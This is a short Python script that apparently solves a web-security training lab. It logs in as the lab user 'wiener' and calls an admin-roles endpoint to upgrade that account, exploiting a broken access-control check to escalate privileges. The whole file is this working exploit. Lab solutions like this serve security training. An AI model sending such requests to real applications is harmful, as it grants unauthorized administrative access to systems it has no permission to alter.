import sys
import requests

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'
admin_roles = burp_url + '/admin-roles?username=wiener&action=upgrade'

session = requests.Session()
burp_data = {"username": "wiener", "password": "peter"}
session.post(login_url, data=burp_data)

session.get(admin_roles)
